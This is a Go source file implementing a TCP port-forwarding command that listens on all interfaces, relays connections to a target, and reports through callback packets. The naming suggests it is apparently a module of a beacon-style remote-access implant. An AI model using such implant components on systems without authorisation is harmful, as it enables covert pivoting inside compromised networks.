package command

import (
	"io"
	"main/packet"
	"main/util"
	"net"
	"strings"
	"sync"
)

var listenerMap sync.Map

type Listener struct {
	listen *net.Listener
	conns  []*net.Conn
}

func join(src io.ReadWriteCloser, dst io.ReadWriteCloser) {
	var wait sync.WaitGroup

	pipe := func(to io.ReadWriteCloser, from io.ReadWriteCloser) {
		defer to.Close()
		defer from.Close()
		buf := make([]byte, 1024)
		defer wait.Done()
		_, err := io.CopyBuffer(to, from, buf)
		if err != nil {
			if strings.HasSuffix(err.Error(), "use of closed network connection") {
				return
			}

			packet.ErrorMessage(err.Error())
			return
		}
	}

	wait.Add(2)
	go pipe(src, dst)
	go pipe(dst, src)
	wait.Wait()
	util.Println("join finished")
}

func portForwardServe(port string, target string) error {
	listen, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return err
	}
	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("Listening on 0.0.0.0: %s, forward to %s", port, target)))
	l := Listener{listen: &listen}
	listenerMap.Store(port, &l)
	go func() {
		for {
			srcConn, err := listen.Accept()
			if err != nil {
				if strings.HasSuffix(err.Error(), "use of closed network connection") {
					return
				}
				packet.ErrorMessage(err.Error())
				return
			}
			dstConn, err := net.Dial("tcp", target)
			if err != nil {
				packet.ErrorMessage(err.Error())
				return
			}
			l.conns = append(l.conns, &srcConn, &dstConn)
			go join(srcConn, dstConn)
		}
	}()
	return nil
}

func portForwardStop(port string) {
	if value, ok := listenerMap.LoadAndDelete(port); ok {
		if listener, ok := value.(*Listener); ok {
			(*listener.listen).Close()
			for _, conn := range listener.conns {
				(*conn).Close()
			}
			packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("stop portforward at %s success", port)))
			return
		}
	}
	packet.ErrorMessage(util.Sprintf("no portforward on %s", port))
}
